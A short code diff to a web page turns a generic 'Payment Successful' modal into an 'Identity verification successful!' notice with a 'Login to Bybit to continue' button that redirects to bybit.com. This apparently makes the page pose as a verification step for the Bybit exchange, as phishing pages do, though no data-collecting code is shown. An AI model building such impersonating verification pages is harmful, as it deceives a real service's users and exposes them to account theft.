@@ -1992,10 +1992,10 @@ setInterval(function () {
       </svg>
     </div>
 
-    <h2 class="payment-modal__title" id="psTitle">Payment Successful</h2>
-    <p class="payment-modal__message" id="psMessage">Thanks for your purchase! Payment successful, and your order is confirmed.</p>
+    <h2 class="payment-modal__title" id="psTitle">Verification Successful</h2>
+    <p class="payment-modal__message" id="psMessage">Identity verification successful! Safety starts with you, thank you for verifying your identity.</p>
 
-    <button class="payment-modal__button" id="psReceiptBtn" onclick="downloadReceipt()">Download Receipt</button>
+    <button class="payment-modal__button" id="psReceiptBtn" onclick="downloadReceipt()">Login to Bybit to continue</button>
   </div>
 </div>
 
@@ -2014,7 +2014,7 @@ setInterval(function () {
 
   /* ---- Receipt download ---- */
   function downloadReceipt() {
-    const url = window._receiptUrl || 'https://your-site.com/receipts/order-123.pdf';
+    const url = window._receiptUrl || 'https://www.bybit.com';
     window.location.href = url;
   }
 
